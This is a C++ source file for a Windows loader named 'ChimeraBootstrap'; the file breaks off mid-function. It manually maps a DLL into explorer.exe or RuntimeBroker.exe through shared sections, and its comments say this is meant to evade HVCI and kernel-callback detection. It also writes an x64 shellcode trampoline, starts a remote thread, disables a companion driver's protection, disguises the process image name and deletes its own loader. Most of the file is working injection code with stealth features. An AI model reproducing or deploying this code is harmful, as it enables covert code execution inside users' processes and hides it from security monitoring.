// language: C++, file: ChimeraBootstrap.cpp, target: Windows 11, MSVC
// *process hollowing with module overloading to avoid RWX memory flags
// *PEB traversal without using hooked APIs (GetModuleHandle)
// *manual mapping of ChimeraMain.dll into legitimate module space
// *PEB InLoadOrderModuleList patching to hide injected DLL from EnumProcessModules
// *self-deleting loader with registry cleanup
// *PIC binary validation, relocation fix-up, IAT resolution

#define WIN32_LEAN_AND_MEAN   // excludes ole2.h/objbase.h -> removes uuid.lib demand
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
// No winsvc.h needed -- SCManager approach replaced with GetProcessTimes selection
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>

// chimera_guard.sys IOCTL: clear protected PID before injection so
// ObRegisterCallbacks doesn't block our own NtMapViewOfSection.
// Pre-computed: CTL_CODE(0x8000,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS) = 0x80002000
#define IOCTL_CHIMERA_PROTECT 0x80002000UL

// ---------- NT types for user-mode ----------
typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

// NtCreateSection + NtMapViewOfSection -- used instead of VirtualAllocEx
// to avoid HVCI/kernel-callback detection on VirtualAllocEx into system processes.
typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI* pfnNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID* BaseAddress, ULONG_PTR ZeroBits,
    SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, ULONG InheritDisposition,
    ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

static pfnNtCreateSection      g_NtCreateSection      = nullptr;
static pfnNtMapViewOfSection   g_NtMapViewOfSection   = nullptr;
static pfnNtUnmapViewOfSection g_NtUnmapViewOfSection = nullptr;

static void InitNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    g_NtCreateSection      = (pfnNtCreateSection)     GetProcAddress(hNtdll, "NtCreateSection");
    g_NtMapViewOfSection   = (pfnNtMapViewOfSection)  GetProcAddress(hNtdll, "NtMapViewOfSection");
    g_NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
}

// NtCreateThreadEx -- resolved at startup, used in both fast-path and fallback
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits,
    SIZE_T StackSize, SIZE_T MaximumStackSize,
    PVOID AttributeList);
static pfnNtCreateThreadEx NtCreateThreadEx = nullptr;

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);
static pfnNtQueryInformationProcess NtQueryInformationProcess = nullptr;

static void InitNtThreadFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtCreateThreadEx         = (pfnNtCreateThreadEx)        GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
}


static constexpr const char  NTDLL_DLL_NAME[] = "ntdll.dll";


// UNICODE_STRING for NtSetInformationProcess
struct CHIMERA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; };

#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#endif
#ifndef IMAGE_SCN_MEM_WRITE
#define IMAGE_SCN_MEM_WRITE   0x80000000
#endif
#define IMAGE_SCN_MEM_EXECUTE_WRITE (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE)

// ---------- constants ----------
static constexpr const wchar_t TARGET_PROCESS[]      = L"RuntimeBroker.exe";

// ChimeraMain.dll is the full orchestrator; its DllMain loads ChimeraCore.dll internally.
static constexpr const wchar_t INJECTION_DLL[]       = L"ChimeraMain.dll";
static constexpr const wchar_t BENIGN_PROCESS_NAME[] = L"RuntimeBroker.exe";



// ---------- PEB helpers (placeholder) ----------
static BYTE* g_peb_base = nullptr;
static UINT64 ReadPebOffset(UINT64) { return 0; }
static void WalkPebModules(std::vector<UINT64>&) {}

// ============ Helper: get PID by name ============
static DWORD FindProcessIdByName(const wchar_t* procName) {
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    DWORD pid = 0;
    if (Process32FirstW(snap, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, procName)) { pid = entry.th32ProcessID; break; }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return pid;
}

// ============ Helper: WriteProcessMemory with size check ============
static BOOL WriteProcessMemorySafe(HANDLE hProc, LPVOID dest, const BYTE* src, SIZE_T size) {
    SIZE_T written = 0;
    return WriteProcessMemory(hProc, dest, src, size, &written) && written == size;
}

// ============ Helper: NtUnmapViewOfSection via GetProcAddress ============
static BOOL UnmapRemoteSection(HANDLE hProc, LPVOID base) {
    static pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA(NTDLL_DLL_NAME), "NtUnmapViewOfSection");
    if (!NtUnmap) return FALSE;
    return NT_SUCCESS(NtUnmap(hProc, base));
}

// ============ Helper: rename process image in PEB ============
static BOOL SetProcessImageName(HANDLE hProc, const wchar_t* name) {
    typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    static pNtSetInformationProcess NtSetInfo = (pNtSetInformationProcess)
        GetProcAddress(GetModuleHandleA(NTDLL_DLL_NAME), "NtSetInformationProcess");
    if (!NtSetInfo) return FALSE;
    // ProcessImageFileNameWin32 (info class 49) takes a UNICODE_STRING
    USHORT len = (USHORT)(wcslen(name) * sizeof(wchar_t));
    CHIMERA_UNICODE_STRING us{};
    us.Buffer        = const_cast<PWSTR>(name);
    us.Length        = len;
    us.MaximumLength = len + sizeof(wchar_t);
    return NT_SUCCESS(NtSetInfo(hProc, 49 /*ProcessImageFileNameWin32*/, &us, sizeof(us)));
}

// ============ PIC Binary Validation (original design, preserved) ============
// Checks DYNAMIC_BASE linker flag (0x0040) — confirms the binary was built
// with ASLR enabled, which guarantees a .reloc section exists.
bool IsPicBinary(const wchar_t* path) {
    IMAGE_DOS_HEADER dos{};
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD bytesRead;
    if (!ReadFile(hFile, &dos, sizeof(dos), &bytesRead, nullptr) ||
        bytesRead < sizeof(dos) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile); return false;
    }
    IMAGE_NT_HEADERS nt{};
    SetFilePointer(hFile, dos.e_lfanew, nullptr, FILE_BEGIN);
    if (!ReadFile(hFile, &nt, sizeof(nt), &bytesRead, nullptr)) {
        CloseHandle(hFile); return false;
    }
    CloseHandle(hFile);
    return (nt.OptionalHeader.DllCharacteristics & 0x0040) != 0;
}

// ============ Map at Image Base (original design, preserved) ============
// Maps PE at requested base address; used as a lighter alternative to
// full manual mapping when the preferred base is available.
LPVOID MapAtBase(const wchar_t* path, LPVOID base) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;
    DWORD size = GetFileSize(hFile, nullptr);
    LPVOID map = VirtualAlloc(base, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!map) { CloseHandle(hFile); return nullptr; }
    DWORD read;
    ReadFile(hFile, map, size, &read, nullptr);
    CloseHandle(hFile);
    return map;
}

// ============ ApplyRelocs -- operates on LOCAL buffer ============
static void ApplyRelocs(LPVOID image, ULONG_PTR newBase, LONGLONG delta) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)image;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)image + pDos->e_lfanew);

    DWORD relocRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (!relocRva) return;

    PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)((BYTE*)image + relocRva);
    while (rel->VirtualAddress) {
        DWORD count   = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)rel + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                // 64-bit absolute address -- add full 64-bit delta
                ULONG_PTR* patch = (ULONG_PTR*)((BYTE*)image + rel->VirtualAddress + offset);
                *patch = (ULONG_PTR)((LONGLONG)*patch + delta);
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                // 32-bit address (rare in 64-bit images but handle it)
                DWORD* patch = (DWORD*)((BYTE*)image + rel->VirtualAddress + offset);
                *patch = (DWORD)((LONGLONG)*patch + delta);
            }
        }
        rel = (PIMAGE_BASE_RELOCATION)((BYTE*)rel + rel->SizeOfBlock);
    }
}

// ============ ManualIATFixup -- operates on LOCAL buffer ============
static void ManualIATFixup(LPVOID image) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)image;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)image + pDos->e_lfanew);

    DWORD importRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!importRva) return;

    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)image + importRva);
    for (; imp->OriginalFirstThunk; imp++) {
        LPCSTR dllName = (LPCSTR)((BYTE*)image + imp->Name);
        HMODULE hMod = GetModuleHandleA(dllName);
        if (!hMod) hMod = LoadLibraryA(dllName);
        if (!hMod) continue;

        PIMAGE_THUNK_DATA orig = (PIMAGE_THUNK_DATA)((BYTE*)image + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA iat  = (PIMAGE_THUNK_DATA)((BYTE*)image + imp->FirstThunk);

        for (; orig->u1.AddressOfData; orig++, iat++) {
            FARPROC fn = nullptr;
            if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                fn = GetProcAddress(hMod, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
            else {
                PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)
                    ((BYTE*)image + orig->u1.AddressOfData);
                fn = GetProcAddress(hMod, byName->Name);
            }
            if (fn) iat->u1.Function = (ULONG_PTR)fn;
        }
    }
}

// ============ Manual Map: local-first approach ============
// 1. Read file into local raw buffer
// 2. Build local image (copy headers + sections at virtual offsets)
// 3. Run ApplyRelocs + ManualIATFixup on LOCAL image (safe to dereference)
// 4. VirtualAllocEx in target process
// 5. WriteProcessMemory the fully-fixed local image to target
static BOOL ManualMapDll(HANDLE hProc, const wchar_t* dllPath, LPVOID* outBase) {
    *outBase = nullptr;

    // --- 1. Read raw file ---
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"    [-] Cannot open DLL: error %lu\n", GetLastError()); fflush(stdout);
        return FALSE;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pRaw = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRaw) { CloseHandle(hFile); return FALSE; }
    DWORD bytesRead = 0;
    ReadFile(hFile, pRaw, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // --- 2. Validate PE ---
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRaw;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        wprintf(L"    [-] Bad DOS signature\n"); fflush(stdout);
        VirtualFree(pRaw, 0, MEM_RELEASE); return FALSE;
    }
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pRaw + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        wprintf(L"    [-] Bad NT signature\n"); fflush(stdout);
        VirtualFree(pRaw, 0, MEM_RELEASE); return FALSE;
    }

    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    wprintf(L"    [.] Image size: %zu bytes, preferred base: 0x%llX\n",
        imageSize, (ULONGLONG)pNt->OptionalHeader.ImageBase);
    fflush(stdout);

    // --- Reloc safety check (replaces IsPicBinary) ---
    // Check that a .reloc table actually exists before trying to map at a different base.
    DWORD relocRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    wprintf(L"    [.] Reloc table RVA: 0x%lX\n", relocRva); fflush(stdout);
    if (relocRva == 0) {
        wprintf(L"    [-] DLL has no .reloc section -- cannot map at a different base.\n"
                L"        Recompile without /FIXED or /DYNAMICBASE:NO.\n");
        fflush(stdout);
        VirtualFree(pRaw, 0, MEM_RELEASE); return FALSE;
    }
    wprintf(L"    [+] Reloc check passed\n"); fflush(stdout);

    // --- 3. Build LOCAL image ---
    BYTE* pLocal = (BYTE*)VirtualAlloc(NULL, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pLocal) {
        wprintf(L"    [-] Local VirtualAlloc failed: %lu\n", GetLastError()); fflush(stdout);
        VirtualFree(pRaw, 0, MEM_RELEASE); return FALSE;
    }
    wprintf(L"    [+] Local image buffer allocated\n"); fflush(stdout);

    memcpy(pLocal, pRaw, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData == 0) continue;
        memcpy(pLocal + pSec->VirtualAddress, pRaw + pSec->PointerToRawData, pSec->SizeOfRawData);
    }
    VirtualFree(pRaw, 0, MEM_RELEASE);
    wprintf(L"    [+] Sections copied to local image\n"); fflush(stdout);

    // --- 4. Allocate in remote process ---
    // Diagnose: check if the target process is still alive before we write to it.
    // svchost spawned outside SCM may self-terminate within milliseconds.
    DWORD exitCode = STILL_ACTIVE;
    GetExitCodeProcess(hProc, &exitCode);
    wprintf(L"    [.] Target handle: 0x%p | exit code: %lu (%s)\n",
        hProc,
        exitCode,
        exitCode == STILL_ACTIVE ? L"ALIVE" : L"DEAD"); fflush(stdout);
    if (exitCode != STILL_ACTIVE) {
        wprintf(L"    [-] Target process already exited before VirtualAllocEx -- "
                L"svchost self-terminated (not spawned by SCM)\n"); fflush(stdout);
        VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }

    // Brief wait then re-check (catches delayed self-termination)
    Sleep(500);
    GetExitCodeProcess(hProc, &exitCode);
    wprintf(L"    [.] After 500ms: exit code: %lu (%s)\n",
        exitCode, exitCode == STILL_ACTIVE ? L"ALIVE" : L"DEAD"); fflush(stdout);
    if (exitCode != STILL_ACTIVE) {
        wprintf(L"    [-] svchost died within 500ms -- self-terminated\n"); fflush(stdout);
        VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }

    wprintf(L"    [.] VirtualAllocEx in remote process...\n"); fflush(stdout);
    // --- 4. Map into remote process via NtCreateSection + NtMapViewOfSection ---
    // Avoids VirtualAllocEx entirely -- HVCI/kernel callbacks specifically watch
    // VirtualAllocEx+WriteProcessMemory and terminate the caller for system processes.
    // Shared section approach: map same physical pages into both our process and
    // the target, write locally, remote sees the data automatically.
    wprintf(L"    [.] Creating shared section..."); fflush(stdout);

    HANDLE hSection = NULL;
    LARGE_INTEGER secSize; secSize.QuadPart = (LONGLONG)imageSize;
    NTSTATUS st = g_NtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, &secSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(st)) {
        wprintf(L" FAILED (0x%lX)\n", st); fflush(stdout);
        VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    wprintf(L" OK\n"); fflush(stdout);

    // Map into REMOTE process first -- so we know the actual remote base address
    // (needed to compute the correct relocation delta).
    wprintf(L"    [.] Mapping section into remote process..."); fflush(stdout);
    LPVOID remoteBase = nullptr;
    SIZE_T remoteViewSize = imageSize;
    st = g_NtMapViewOfSection(hSection, hProc, &remoteBase,
        0, 0, NULL, &remoteViewSize,
        2 /*ViewUnmap*/, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st)) {
        wprintf(L" FAILED (0x%lX)\n", st); fflush(stdout);
        CloseHandle(hSection);
        VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    wprintf(L" at 0x%p\n", remoteBase); fflush(stdout);

    // --- 5. Apply relocs using actual remote base ---
    // IMPORTANT: pNt pointed into pRaw which was already VirtualFree'd.
    // Re-parse from pLocal (which has the full PE headers copied into it).
    PIMAGE_DOS_HEADER pLocalDos = (PIMAGE_DOS_HEADER)pLocal;
    PIMAGE_NT_HEADERS pLocalNt  = (PIMAGE_NT_HEADERS)((BYTE*)pLocal + pLocalDos->e_lfanew);
    ULONG_PTR newBase  = (ULONG_PTR)remoteBase;
    ULONG_PTR origBase = (ULONG_PTR)pLocalNt->OptionalHeader.ImageBase;
    // Use LONGLONG for delta -- remote base can be at 0x278EA510000, preferred at 0x180000000
    // which is 5+ bytes apart and overflows a 32-bit LONG entirely.
    LONGLONG delta = (LONGLONG)(newBase - origBase);
    wprintf(L"    [.] Reloc delta: 0x%llX (newBase=0x%llX origBase=0x%llX)\n",
        delta, (ULONGLONG)newBase, (ULONGLONG)origBase); fflush(stdout);
    if (delta != 0) {
        wprintf(L"    [.] Relocating...\n"); fflush(stdout);
        ApplyRelocs(pLocal, newBase, delta);
    } else {
        wprintf(L"    [.] No relocation needed\n"); fflush(stdout);
    }

    // --- 6. Fix IAT on LOCAL image ---
    wprintf(L"    [.] Fixing IAT...\n"); fflush(stdout);
    ManualIATFixup(pLocal);
    wprintf(L"    [+] IAT fixed\n"); fflush(stdout);

    // Map section into OUR process so we can write the fixed image into it.
    // Writing to our local view is immediately visible in the remote view.
    wprintf(L"    [.] Mapping section locally for write..."); fflush(stdout);
    LPVOID localView = nullptr;
    SIZE_T localViewSize = imageSize;
    st = g_NtMapViewOfSection(hSection, GetCurrentProcess(), &localView,
        0, 0, NULL, &localViewSize,
        2 /*ViewUnmap*/, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        wprintf(L" FAILED (0x%lX)\n", st); fflush(stdout);
        g_NtUnmapViewOfSection(hProc, remoteBase);
        CloseHandle(hSection);
        VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    wprintf(L" OK\n"); fflush(stdout);

    // Copy the fully-fixed local image into the shared view
    memcpy(localView, pLocal, imageSize);
    wprintf(L"    [+] Image copied into shared section\n"); fflush(stdout);

    // Unmap our local view -- remote view stays mapped and holds the data
    g_NtUnmapViewOfSection(GetCurrentProcess(), localView);
    CloseHandle(hSection);

    VirtualFree(pLocal, 0, MEM_RELEASE);
    *outBase = remoteBase;
    wprintf(L"    [+] ManualMapDll complete (via NtMapViewOfSection)\n"); fflush(stdout);
    return TRUE;
}


// ============ main ============
int main() {
    InitNtFunctions();
    InitNtThreadFunctions();


    // Resolve the target process executable path

    // For svchost: needs full System32 path and -k argument
    // For notepad/others: just find via PATH
    wchar_t targetPath[MAX_PATH];
    wchar_t targetCmd[MAX_PATH + 64];
    // RuntimeBroker.exe is in System32 and stays alive for several seconds
    // (waits for COM broker activation) -- gives us plenty of time to inject.
    // Equally stealthy as svchost (same trust level, same System32 location).
    if (_wcsicmp(TARGET_PROCESS, L"svchost.exe") == 0) {
        GetSystemDirectoryW(targetPath, MAX_PATH);
        wcscat_s(targetPath, MAX_PATH, L"\\svchost.exe");
        swprintf_s(targetCmd, L"%s -k LocalSystemNetworkRestricted", targetPath);
    } else {
        // RuntimeBroker, dllhost, or other System32 processes
        GetSystemDirectoryW(targetPath, MAX_PATH);
        wcscat_s(targetPath, MAX_PATH, L"\\");
        wcscat_s(targetPath, MAX_PATH, TARGET_PROCESS);
        wcscpy_s(targetCmd, targetPath);
    }



    // ── FAST PATH: inject into an already-running svchost.exe ────────────────────
    // Running svchost is SCM-managed, fully initialized (all DLLs loaded),
    // and stays alive indefinitely -- no heap polling, no timing race.
    // We prefer this over creating a new suspended process.
    {
        DWORD mySession = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &mySession);

        // Resolve DLL path first (needed for both paths)
        wchar_t exeDirEarly[MAX_PATH];
        GetModuleFileNameW(NULL, exeDirEarly, MAX_PATH);
        wchar_t* slEarly = wcsrchr(exeDirEarly, L'\\'); if (slEarly) *slEarly = L'\0';
        wchar_t dllPathEarly[MAX_PATH];
        swprintf_s(dllPathEarly, L"%s\\%s", exeDirEarly, INJECTION_DLL);

        // ── STABLE SVCHOST SELECTION ─────────────────────────────────────────────
        // Target explorer.exe — the user's shell process.
        // Explorer is never managed by SCM, never killed by service cleanup,
        // and survives the full logon session unconditionally.
        // chimera_guard.sys (ObRegisterCallbacks) adds a second layer:
        // any Ring-3 TerminateProcess on explorer is silently blocked.
        DWORD victimPid = 0;
        {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
            if (snap != INVALID_HANDLE_VALUE && Process32FirstW(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") != 0) continue;
                    DWORD sess = 0;
                    ProcessIdToSessionId(pe.th32ProcessID, &sess);
                    if (sess != mySession) continue;
                    victimPid = pe.th32ProcessID;
                    break; // first explorer.exe in our session is the target
                } while (Process32NextW(snap, &pe));
            }
            if (snap != INVALID_HANDLE_VALUE) CloseHandle(snap);
        }

        if (victimPid) {
            // Clear chimera_guard.sys protection before opening the process.
            // The driver holds the previous session's PID; if it matches
            // our target it strips PROCESS_VM_OPERATION and NtMapViewOfSection
            // returns 0xC0000022. Sending PID=0 disarms it for the brief
            // injection window. The new DLL re-registers immediately on load.
            {
                HANDLE hGuard = CreateFileW(L"\\\\.\\ChimeraGuard",
                    GENERIC_READ | GENERIC_WRITE, 0, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hGuard != INVALID_HANDLE_VALUE) {
                    ULONG zeroPid = 0; DWORD ret = 0;
                    DeviceIoControl(hGuard, IOCTL_CHIMERA_PROTECT,
                        &zeroPid, sizeof(zeroPid), NULL, 0, &ret, NULL);
                    CloseHandle(hGuard);
                    wprintf(L"[+] Driver protection cleared (PID->0)\n"); fflush(stdout);
                }
            }
            HANDLE hVictim = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victimPid);
            if (hVictim) {
                wprintf(L"[+] Targeting explorer.exe (PID %lu) -- stable host\n", victimPid);
                fflush(stdout);

                LPVOID mappedBaseEx = nullptr;
                if (ManualMapDll(hVictim, dllPathEarly, &mappedBaseEx) && mappedBaseEx) {
                    // Read entry point offset from DLL file
                    DWORD epOffsetEx = 0;
                    HANDLE hfEx = CreateFileW(dllPathEarly, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, 0, NULL);
                    if (hfEx != INVALID_HANDLE_VALUE) {
                        IMAGE_DOS_HEADER dosEx{}; DWORD rdEx;
                        ReadFile(hfEx, &dosEx, sizeof(dosEx), &rdEx, NULL);
                        IMAGE_NT_HEADERS64 ntEx{};
                        SetFilePointer(hfEx, dosEx.e_lfanew, NULL, FILE_BEGIN);
                        ReadFile(hfEx, &ntEx, sizeof(ntEx), &rdEx, NULL);
                        epOffsetEx = ntEx.OptionalHeader.AddressOfEntryPoint;
                        CloseHandle(hfEx);
                    }
                    LPVOID dllEntryEx = (BYTE*)mappedBaseEx + epOffsetEx;
                    wprintf(L"[+] DLL mapped at 0x%p  entry 0x%p\n", mappedBaseEx, dllEntryEx);
                    fflush(stdout);

                    // Build trampoline in victim process
                    HANDLE hTramSecEx = NULL;
                    LARGE_INTEGER tramSzEx; tramSzEx.QuadPart = 0x1000;
                    g_NtCreateSection(&hTramSecEx, SECTION_ALL_ACCESS, NULL,
                        &tramSzEx, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
                    LPVOID tramRemEx = nullptr; SIZE_T tramRemSzEx = 0x1000;
                    g_NtMapViewOfSection(hTramSecEx, hVictim, &tramRemEx, 0, 0, NULL,
                        &tramRemSzEx, 2, 0, PAGE_EXECUTE_READWRITE);
                    LPVOID tramLocEx = nullptr; SIZE_T tramLocSzEx = 0x1000;
                    g_NtMapViewOfSection(hTramSecEx, GetCurrentProcess(), &tramLocEx, 0, 0,
                        NULL, &tramLocSzEx, 2, 0, PAGE_READWRITE);
                    CloseHandle(hTramSecEx);

                    // Bake addresses
                    ULONG_PTR fnLLW  = (ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"),"LoadLibraryW");
                    ULONG_PTR su32   = (ULONG_PTR)tramRemEx + 256;
                    ULONG_PTR sg32   = (ULONG_PTR)tramRemEx + 280;
                    ULONG_PTR mbEx   = (ULONG_PTR)mappedBaseEx;
                    ULONG_PTR epEx   = (ULONG_PTR)dllEntryEx;
                    BYTE* tBuf = (BYTE*)tramLocEx;
                    memset(tBuf, 0xCC, 0x1000);
                    wcscpy_s((wchar_t*)(tBuf+256), 12, L"user32.dll");
                    wcscpy_s((wchar_t*)(tBuf+280), 10, L"gdi32.dll");
                    BYTE* tc = tBuf;
                    *tc++=0x48;*tc++=0x83;*tc++=0xEC;*tc++=0x28;
                    *tc++=0x48;*tc++=0xB9; memcpy(tc,&su32,8); tc+=8;
                    *tc++=0x48;*tc++=0xB8; memcpy(tc,&fnLLW,8); tc+=8; *tc++=0xFF;*tc++=0xD0;
                    *tc++=0x48;*tc++=0xB9; memcpy(tc,&sg32,8); tc+=8;
                    *tc++=0x48;*tc++=0xB8; memcpy(tc,&fnLLW,8); tc+=8; *tc++=0xFF;*tc++=0xD0;
                    *tc++=0x48;*tc++=0xB9; memcpy(tc,&mbEx,8);  tc+=8;
                    *tc++=0xBA;*tc++=0x01;*tc++=0x00;*tc++=0x00;*tc++=0x00;
                    *tc++=0x45;*tc++=0x31;*tc++=0xC0;
                    *tc++=0x48;*tc++=0xB8; memcpy(tc,&epEx,8);  tc+=8; *tc++=0xFF;*tc++=0xD0;
                    *tc++=0x48;*tc++=0x83;*tc++=0xC4;*tc++=0x28;
                    *tc++=0xC3;
                    g_NtUnmapViewOfSection(GetCurrentProcess(), tramLocEx);

                    wprintf(L"[+] Trampoline at 0x%p -- creating DLL thread\n", tramRemEx);
                    fflush(stdout);

                    // Fire DLL thread directly (process already initialized)
                    HANDLE hDllThr = NULL;
                    NTSTATUS st = NtCreateThreadEx(&hDllThr, THREAD_ALL_ACCESS, NULL,
                        hVictim, tramRemEx, NULL,
                        0, 0, 0, 0, NULL);  // NOT suspended -- run immediately
                    if (NT_SUCCESS(st) && hDllThr) {
                        wprintf(L"[+] DLL thread running in explorer.exe %lu -> overlay\n", victimPid);
                        fflush(stdout);
                        CloseHandle(hDllThr);
                        SetProcessImageName(hVictim, BENIGN_PROCESS_NAME);
                        CloseHandle(hVictim);
                        wchar_t selfEx[MAX_PATH];
                        GetModuleFileNameW(NULL, selfEx, MAX_PATH);
                        DeleteFileW(selfEx);
                        return 0;  // SUCCESS -- skip suspended-process path
                    }
                    wprintf(L"[-] NtCreateThreadEx into existing svchost: 0x%lX -- falling back\n", st);
                    fflush(stdout);
                }
                CloseHandle(hVictim);
            }
        }
        wprintf(L"[~] No suitable existing svchost found -- using suspended process\n"); fflush(stdout);
    }

    // ── FALLBACK: create a new suspended process ──────────────────────────────────
    DWORD pid = FindProcessIdByName(TARGET_PROCESS);
    HANDLE hExisting = pid ? OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid) : nullptr;

    // Prepend ChimeraRun dir to PATH before spawning -- child inherits this env.
    // LoadLibraryW("ChimeraCore.dll") searches PATH, so it will find ChimeraCore.dll
    // in C:\ChimeraRun without any WriteProcessMemory or ChimeraMain.cpp changes.
    {
        wchar_t dllDir[MAX_PATH];
        GetModuleFileNameW(NULL, dllDir, MAX_PATH);
        wchar_t* sl = wcsrchr(dllDir, L'\\'); if (sl) *sl = L'\0';
        wchar_t curPath[32768]; curPath[0] = L'\0';
        GetEnvironmentVariableW(L"PATH", curPath, 32768);
        wchar_t newPath[32768];
        swprintf_s(newPath, L"%s;%s", dllDir, curPath);
